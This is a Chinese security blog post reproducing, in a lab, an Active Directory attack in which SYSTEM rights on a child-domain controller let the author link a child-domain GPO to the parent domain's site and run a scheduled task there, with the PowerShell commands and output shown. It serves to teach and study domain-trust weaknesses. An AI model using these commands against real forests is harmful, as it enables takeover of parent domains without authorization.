---
title: 利用子域的System权限通往父域
url: https://www.secpulse.com/archives/205369.html
source: 安全脉搏
date: 2025-01-01
fetch_date: 2025-10-06T20:06:14.905439
---

# 利用子域的System权限通往父域

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 利用子域的System权限通往父域

[内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2024-12-31

15,153

## 前言

最近翻阅笔记发现一篇文章提到通过子域的System权限可以突破获取到父域权限，本文将对此技术进行尝试复现研究。

## 利用分析

环境信息：

```
子域：187、sub.cs.org
父域：197、cs.org
```

首先通过在子域的域控机器上打开mmc.exe->连接ADSI->配置来查看子域的配置命名上下文：

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202408231640869.jpg)

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202408231640871.jpg)

从配置中可以看到配置命名上下文的域名实际上是父域cs.org，因此判断子域中看到的信息可能是父域的副本：

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202408231640872.jpg)

继续查看配置对象的安全描述符中的ACL，发现子域没有权限去变更：

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202408231640873.jpg)

但是可以看到除了域用户、域管用户以外，还有一个特权ACL条目叫SYSTEM，该条目拥有完全控制权限：

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202408231640874.jpg)

SYSTEM属于一个特殊用户，不属于域内用户，因此理论上只要能做到是SYSTEM权限就能控制对象条目而不用关注是不是域内管理员。因此尝试使用SYSTEM权限继续打开配置命名上下文：

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202408231640875.jpg)

可以看到当子域拥有了SYSTEM权限后就可以修改来自父域副本的配置对象：

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202408231640876.jpg)

## 利用方式

既然可以控制父域的配置命名上下文，那如何利用呢？网上提到有几种方式，一种是通过GPO、还有的是提到给父域添加一个自己可控的证书模板(ESC1)，这里以GPO组策略为例。先在子域域控上创建一个GPO:

```
New-GPO jumbo_gpo_test
```

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202408231640877.jpg)

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202408231640878.jpg)

设置计划任务:

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202408231640880.jpg)

通过SYSTEM权限把子域的GPO link到父域：

```
PS C:\Windows\system32> Get-ADDomainController -Server cs.org | select HostNane, ServerObjectDN

HostNane ServerObjectDN
-------- --------------
{}       CN=10_4_45_197,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cs,DC=org
```

```
PS C:\Windows\system32> New-GPLink -Name "jumbo_gpo_test" -Target "CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cs,DC=org" -Server sub.cs.org

GpoId       : 76606696-cd03-4349-b0f2-0a45bdf305d4
DisplayName : jumbo_gpo_test
Enabled     : True
Enforced    : False
Target      : CN=Default-First-Site-Name,cn=Sites,CN=Configuration,DC=cs,DC=org
Order       : 1
```

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202408231640881.jpg)

父域刷新组策略可以看到子域链接过来的GPO：

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202408231640882.jpg)

父域更新组策略成功执行计划任务notepad.exe：

```
gpupdate /force
```

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202408231640883.jpg)

刷新组策略后通过`gpresult /r`命名也可以看到添加的GPO：

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202408231640884.jpg)

## 总结

本文介绍了除`SidHistory`以外还可以通过子域的System权限进行突破到父域的攻击手法。

**本文作者：[蚁景网安实验室](newpage/author?author_id=37244)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/205369.html**](https://www.secpulse.com/archives/205369.html)

点赞：
0
[评论：0](#goComment)
收藏：
0

*新浪微博
QQ空间
微信扫一扫*

### 相关文章

* [![记一次有点抽象的渗透经历](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2025/01/VCG41N1195673150.png)

  记一次有点抽象的渗透经历](https://www.secpulse.com/archives/205044.html "详细阅读 记一次有点抽象的渗透经历")
* [![浅谈内联钩取原理与实现](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2024/06/VCG211415001580-210x140.jpg)

  浅谈内联钩取原理与实现](https://www.secpulse.com/archives/205124.html "详细阅读 浅谈内联钩取原理与实现")
* [![浅谈进程隐藏技术](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2025/01/vcg.png)

  浅谈进程隐藏技术](https://www.secpulse.com/archives/205188.html "详细阅读 浅谈进程隐藏技术")

评论  (0)

昵称

必填
您当前尚未登录。
[登录？](https://www.secpulse.com/user_login "登录")
[注册](https://www.secpulse.com/user-register)

邮箱

必填（保密）

快来写下你的想法吧！

upload

|  |  |  |
| --- | --- | --- |
| [![]( https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2024/12/logo-white.png)](https://www.secpulse.com/newpage/author?author_id=37244aaa) | [蚁景网安实验室 ![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)](https://www.secpulse.com/newpage/author?author_id=37244) | |
| 文章数：402 | 积分： 877 |
| 蚁景网安实验室（www.yijinglab.com）网络安全靶场练习平台，涉及CTF赛前指导、职业技能训练、网安专项技能提升等。 | |

* [![阿波罗主机安全管理](/wp-content/themes/secpulse2017/img/product-agent.png)](https://linkage.duoyinsu.com)
* [![伏特漏洞扫描云平台](/wp-content/themes/secpulse2017/img/product-fute.png)](https://v.duoyinsu.com)

### 安全问答社区

![安全问答社区](https://www.secpulse.com/wp-content/themes/secpulse2017/img/xcx.png)

### 脉搏官方公众号

![脉搏公众号](https://www.secpulse.com/wp-content/themes/secpulse2017/img/SecPulse.png)

### 活动日程

[显示更多](https://www.secpulse.com/newpage/activity)

#### 2022-06-17

[Gdevops 全球敏捷运维峰会](https://www.bagevent.com/event/8022600?bag_track=AQMB)

#### 2022-05-12

[Mastering the Challenge！——来自The 3rd AutoCS 2022智能汽车信息安全大会的邀请函](https://autocs2022.artisan-event.com/)

#### 2021-11-18

[AutoSW 2021智能汽车软件开发大会](https://autosw2021.artisan-event.com)

#### 2021-06-27

[2021中国国际网络安全博览会暨高峰论坛](http://www.sins-expo.com)

#### 2021-05-27

[The 2nd AutoCS 2021智能汽车信息安全大会](https://artisan-event.com/AutoCS2021/)

#### 2020-12-18

[贝壳找房2020 ICS安全技术峰会](https://www.4hou.com/tickets/bmZO)

#### 2020-12-11

[全球敏捷运维峰会（Gdevops2020）](https://www.bagevent.com/event/6243820?bag_track=AQMB)

#### 2020-12-04

[2020京麒网络安全大会](https://www.huodongxing.com/event/5569026023500)

#### 2020-11-29

[OPPO技术开放日第六期|聚焦应用与数据安全防护](https://mp.weixin.qq.com/s/kXt5PAD3bPcHUZjl6rziCw)

#### 2020-11-27

[EISS-2020企业信息安全峰会之上海站 11.27](https://open.weixin.qq.com/connect/oauth2/authorize?appid=wx187be17d5a2961cf&redirect_uri=httpswww.bagevent.comevent6531722&response_type=code&scope=snsapi_userinfo&state=STATE#wechat_redirect)

#### 2020-09-24

[CSDI summit中国软件研发管理行业技术峰会](https://www.bagevent.com/event/csdisummit)

#### 2020-09-23

[2020中国国际智慧能源暨能源数据中心与网络信息安全装备展览会](http:...